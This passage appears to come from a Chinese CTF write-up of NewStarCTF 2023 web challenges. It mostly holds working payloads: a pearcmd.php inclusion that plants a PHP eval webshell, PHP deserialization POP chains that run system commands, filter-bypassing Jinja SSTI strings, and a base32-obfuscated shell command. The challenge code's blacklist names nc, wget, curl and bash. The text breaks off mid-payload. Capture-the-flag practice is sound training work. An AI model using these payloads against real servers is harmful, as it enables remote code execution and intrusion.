<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125;<br>        <br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>        <span class="hljs-comment"># Something in phpinfo.php!</span><br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>提示去看phpinfo.php，打开搜索flag看到fake{check_register_argc_argv}</p><p><a href="https://blog.csdn.net/JCPS_Y/article/details/127541665">浅谈文件包含之包含pearcmd.php漏洞_register_argc_argv文件包含-CSDN博客</a></p><p><a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html</a></p><p>buuctf 的靶机是用 docker 搭的, 猜测默认环境下应该也会有 pearcmd.php根据文章所说, docker php 环境下 <code>register_argc_argv</code> 默认为 On, 也就是说我们可以通过 query-string 来控制 <code>$_SERVER[&#39;argv&#39;]</code>, 即执行 pearcmd.php 所需要的参数</p><p>payload 如下:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gradle">?+config-create+<span class="hljs-regexp">/&amp;file=/u</span>sr<span class="hljs-regexp">/local/</span>lib<span class="hljs-regexp">/php/</span>pearcmd&amp;<span class="hljs-regexp">/&lt;?=@eval($_POST[1]);?&gt;+/</span>tmp/hello.php<br>需要在burp中传入，在hackbar传入会被url编码<br><br>?<span class="hljs-keyword">file</span>=<span class="hljs-regexp">/tmp/</span>hello<br>POST传参命令执行<br></code></pre></td></tr></table></figure><p><img src="/2023/10/23/NewStarCTF2023/week3_1.jpg" alt="week3_1"></p><p><img src="/2023/10/23/NewStarCTF2023/week3_2.png" alt="week3_2"></p><h3 id="medium-sql"><a href="#medium-sql" class="headerlink" title="medium_sql"></a>medium_sql</h3><p>sqlmap一把梭，布尔盲注时间有点久</p><h3 id="POP-Gadget"><a href="#POP-Gadget" class="headerlink" title="POP Gadget"></a>POP Gadget</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title class_">Begin</span>::<span class="hljs-variable constant_">__destruct</span> -&gt; <span class="hljs-title class_">Then</span>::<span class="hljs-variable constant_">__toString</span> -&gt; <span class="hljs-title class_">Super</span>::<span class="hljs-variable constant_">__invoke</span> -&gt; <span class="hljs-title class_">Handle</span>::<span class="hljs-variable constant_">__call</span> -&gt; CTF::<span class="hljs-variable constant_">end</span> -&gt; <span class="hljs-title class_">WhiteGod</span>::<span class="hljs-variable constant_">__unset</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$this</span>-&gt;name))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Good Job!&quot;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$vars</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">end</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">getStr</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;==GAME OVER==&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;handle-&gt;log);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    &#125;<br>&#125;<br><br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br>     <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>        &#125;<br>    &#125;<br>     <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;     <br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)    </span><br><span class="hljs-function">        </span>&#123;     <br>            <span class="hljs-variable">$s</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Super</span>();    <br>            <span class="hljs-variable language_">$this</span>-&gt;func=<span class="hljs-variable">$s</span>;    <br>        &#125;    <br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            (<span class="hljs-variable language_">$this</span>-&gt;func)();<span class="hljs-comment">//这里把Super当函数调用，实际触发了Super()里面的__invoke方法</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Good Job!&quot;</span>;<br>        &#125;<br>    &#125; <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;obj=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CTF</span>();<span class="hljs-comment">//实例化CTF（）后给这里的obj赋值</span><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$vars</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">end</span>();<span class="hljs-comment">//调用了CTF（）里的end()方法</span><br>        &#125;<br>    &#125; <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;obj=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Handle</span>();<span class="hljs-comment">//为protected $obj赋值</span><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">getStr</span>();<span class="hljs-comment">//Handle 类没有定义 getStr() 方法，因此在调用这个方法时会触发 handle里的__call() 魔术方法</span><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;==GAME OVER==&quot;</span>);<br>        &#125;<br>    &#125;     <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>;    <br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)     </span><br><span class="hljs-function">        </span>&#123;   <br>            <span class="hljs-variable">$w</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">WhiteGod</span>();    <br>            <span class="hljs-variable language_">$this</span>-&gt;handle=<span class="hljs-variable">$w</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;handle-&gt;log);<span class="hljs-comment">//在这个end()方法中我们试图用unset（）删除WhiteGod()里面的log属性</span><br>        &#125;<br>    &#125;  <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>=<span class="hljs-string">&#x27;system&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>=<span class="hljs-string">&quot;cat /flag&quot;</span>;  <br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            (<span class="hljs-variable language_">$this</span>-&gt;func)(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>);    <br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Begin</span>();<br>    <span class="hljs-variable">$b</span>-&gt;name=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Then</span>();<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>));<br><span class="hljs-comment">//POP Gadget: // Begin::__destruct -&gt; Then::toString -&gt; Super::__invoke -&gt; Handle::__call -&gt; CTF::end -&gt; WhiteGod::__unset</span><br></code></pre></td></tr></table></figure><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">__destruct</span>() 中，由于 <span class="hljs-variable">$name</span> 包含一个 Then 对象，会触发 <span class="hljs-built_in">__toString</span>() 魔术方法。<br>在 <span class="hljs-built_in">__toString</span>() 方法中，首先调用 <span class="hljs-variable">$this</span>-&gt;func 属性指向的对象（即 Super 对象），<br>接下来进入 Super 类，由于该类含有一个 <span class="hljs-built_in">__invoke</span>() 魔术方法，因此在调用 Super 对象时会触发 <span class="hljs-built_in">__invoke</span>() 方法。<br>在 <span class="hljs-built_in">__invoke</span>() 方法中，又会调用 <span class="hljs-variable">$this</span>-&gt;obj-&gt;<span class="hljs-built_in">getStr</span>() 方法，并进入 Handle 类中。<br><br>由于 Handle 类没有定义 <span class="hljs-built_in">getStr</span>() 方法，因此在调用这个方法时会触发 <span class="hljs-built_in">__call</span>() 魔术方法。<br>在 <span class="hljs-built_in">__call</span>() 方法中，将会调用 <span class="hljs-variable">$this</span>-&gt;obj-&gt;<span class="hljs-built_in">end</span>() 方法，并触发 CTF 类中的 <span class="hljs-built_in">end</span>() 方法。<br><br>在 CTF 类的 <span class="hljs-built_in">end</span>() 方法中，我们会调用 <span class="hljs-built_in">unset</span>($this-&gt;handle-&gt;log)，<br>从而触发 WhiteGod 类的 <span class="hljs-built_in">__unset</span>() 魔术方法。<br>在 <span class="hljs-built_in">__unset</span>() 方法中，我们构造了一个命令行字符串，然后通过执行漏洞执行了系统命令。<br></code></pre></td></tr></table></figure><h3 id="GenShin"><a href="#GenShin" class="headerlink" title="GenShin"></a>GenShin</h3><p>Python的SSTI</p><p><img src="/2023/10/23/NewStarCTF2023/image-20231024140308292.png" alt="image-20231024140308292"></p><p>发现文件路径，使用name传参访问</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs perl">?name=&#123;&#123;<span class="hljs-number">7</span>*<span class="hljs-number">7</span>&#125;&#125;                              发现过滤了连续的&#123;&#123;&#125;&#125;<br>?name=&#123;%print(<span class="hljs-number">7</span>*<span class="hljs-number">7</span>)%&#125;                        出现<span class="hljs-number">49</span> 说明成功了 <br>我们看下config配置 看看key  没有，那考点应该不是爆破 查看一下子类<br>?name=&#123;%print<span class="hljs-string">&quot;&quot;</span>|attr(<span class="hljs-string">&quot;__class__&quot;</span>)|attr(<span class="hljs-string">&quot;__base__&quot;</span>)|attr(<span class="hljs-string">&quot;__subclasses__&quot;</span>)()%&#125;<br>查找到&lt;class <span class="hljs-string">&#x27;os._wrap_close&#x27;</span>&gt;在第[<span class="hljs-number">128</span>]个子类名<br>使用__init_<span class="hljs-number">_</span>方法再调用__globals_<span class="hljs-number">_</span>可以获取到方法内以字典的形式返回的方法、属性等值，但这里init被过滤我们采用<span class="hljs-string">&quot;+&quot;</span>进行绕过 即in<span class="hljs-string">&quot;+&quot;</span>it<br>?name=&#123;%print<span class="hljs-string">&quot;&quot;</span>|attr(<span class="hljs-string">&quot;__class__&quot;</span>)|attr(<span class="hljs-string">&quot;__base__&quot;</span>)|attr(<span class="hljs-string">&quot;__subclasses__&quot;</span>)()|attr(<span class="hljs-number">132</span>)|attr(<span class="hljs-string">&quot;__in&quot;</span>+<span class="hljs-string">&quot;it__&quot;</span>)|attr(<span class="hljs-string">&quot;__globals__&quot;</span>)%&#125;<br>找到了<span class="hljs-keyword">eval</span> 然后我们可按照下面这样来构造命令<br>popen被过滤 但是我们可用采用<span class="hljs-keyword">chr</span>编码进行绕过__import_<span class="hljs-number">_</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;ls /&#x27;</span>).read()进行<span class="hljs-keyword">chr</span>编码,<br>但我们还是要执行这个函数<span class="hljs-keyword">eval</span>(__import_<span class="hljs-number">_</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;ls /&#x27;</span>).read())<br>发现flag之后也是一样的改为__import_<span class="hljs-number">_</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;cat /flag&#x27;</span>).read() 进行<span class="hljs-keyword">chr</span>编码<br>?name=&#123;%print<span class="hljs-string">&quot;&quot;</span>|attr(<span class="hljs-string">&quot;__class__&quot;</span>)|attr(<span class="hljs-string">&quot;__base__&quot;</span>)|attr(<span class="hljs-string">&quot;__subclasses__&quot;</span>)()|attr(<span class="hljs-number">10</span>)|attr(<span class="hljs-string">&quot;__in&quot;</span>+<span class="hljs-string">&quot;it__&quot;</span>)|attr(<span class="hljs-string">&quot;__globals__&quot;</span>)|attr(<span class="hljs-string">&quot;get&quot;</span>)(<span class="hljs-string">&quot;__builtins__&quot;</span>)|attr(<span class="hljs-string">&quot;get&quot;</span>)(<span class="hljs-string">&quot;eval&quot;</span>)(<span class="hljs-string">&quot;eval(chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)%2bchr(40)%2bchr(39)%2bchr(111)%2bchr(115)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)%2bchr(40)%2bchr(39)%2bchr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(114)%2bchr(101)%2bchr(97)%2bchr(100)%2bchr(40)%2bchr(41))&quot;</span>)%&#125;<br>flag&#123;<span class="hljs-number">50</span>febb8e-<span class="hljs-number">61</span>b<span class="hljs-number">0</span>-<span class="hljs-number">42</span>d6-bfc9-<span class="hljs-number">906243946038</span>&#125;<br></code></pre></td></tr></table></figure><p>官方wp：ban掉了一些内置函数但还剩下get_flashed_message()</p><p>直接<code>&#123;% print(get_flashed_messages.__globals__.os["pop"+"en"]("cat /flag").read()) %&#125;</code></p><h3 id="R-C-E-2"><a href="#R-C-E-2" class="headerlink" title="R!!!C!!!E!!!"></a>R!!!C!!!E!!!</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">minipop</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qwejaskdjnlka</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;code))&#123;<br>            <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$this</span>-&gt;code);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;alright&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;qwejaskdjnlka;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]))&#123;<br>    <span class="hljs-comment">//wanna try?</span><br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>链子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">minipop</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qwejaskdjnlka</span>;<br>&#125;<br><span class="hljs-variable">$Minipop</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">minipop</span>();<br><span class="hljs-variable">$Minipop</span>-&gt;qwejaskdjnlka = <span class="hljs-variable">$Minipop</span>;<br><span class="hljs-variable">$Minipop</span>-&gt;code = <span class="hljs-string">&#x27;echo &quot;JJLEMRSDK5BUQR2KIJCUGUSTK5FUUSSVINJUWVKJJZDVKTKXKNMEWRSFKVCVIU2PJFLESVKJJZBUWS2KIFKU2TSLKRETKRSUJNKVGUKKGVFEMRKXINBEUUSOIZCVEMSGJRDEUVCJKRFVGS2OIVCUWV2DIVEVMR2WIVLUGR2MIZGVMSKUJNHEWSSJIVHVESZSJFJEIVJUKFJUESJVIFKE6UJSJZFFMRSFI46T2PI=&quot; | base32 -d | base32 -d |base32 -d |/bin/[r-t]h&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$Minipop</span>);<br></code></pre></td></tr></table></figure><p>因为对bash进行了过滤，所以用base32进行加密，正则匹配发现被匹配到了，于是多加密了两层</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;JJLEMRSDK5BUQR2KIJCUGUSTK5FUUSSVINJUWVKJJZDVKTKXKNMEWRSFKVCVIU2PJFLESVKJJZBUWS2KIFKU2TSLKRETKRSUJNKVGUKKGVFEMRKXINBEUUSOIZCVEMSGJRDEUVCJKRFVGS2OIVCUWV2DIVEVMR2WIVLUGR2MIZGVMSKUJNHEWSSJIVHVESZSJFJEIVJUKFJVOSKWIFLFGUSCKVFEUSSGIVJEWSSIKU3FIMSQJI2UQVJ5HU6T2PJ5&quot;</span> | <span class="hljs-built_in">base32</span> -d | <span class="hljs-built_in">base32</span> -d |<span class="hljs-built_in">base32</span> -d |/bin/[r-t]h<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">payload</span>=O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;minipop&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;code&quot;</span>;s:<span class="hljs-number">287</span>:<span class="hljs-string">&quot;echo 